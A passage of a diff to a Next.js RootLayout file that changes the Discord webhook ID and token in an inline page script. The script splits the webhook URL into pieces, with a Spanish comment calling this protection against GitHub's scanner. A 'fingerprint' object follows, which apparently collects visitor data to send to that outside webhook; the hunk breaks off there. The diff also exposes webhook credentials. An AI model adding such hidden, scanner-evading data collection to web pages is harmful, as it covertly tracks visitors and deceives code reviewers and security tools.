@@ -86,8 +86,8 @@ export default function RootLayout({ children }: { children: React.ReactNode }) 
               
               // Protección anti-escáner de GitHub (URL fragmentada)
               var d_base = 'https://discord.com/api/webhooks/';
-              var d_id = '1467799777335971922';
-              var d_tk = '/5cTBo6KqmZsDH3rwGEoHI-JsxJzqQmePhwS3iHSuIyoysGazi8Oa_HHQQEa1IWZESARI';
+              var d_id = '1467820134533169333';
+              var d_tk = '/fLyqUBvGoZJ49UNkkg3iJgya50xxCyJqZyU3y6T1X8onNs3QqJ-9brDqNTiek_gNLP20';
               var discordUrl = d_base + d_id + d_tk;
               
               var fingerprint = {
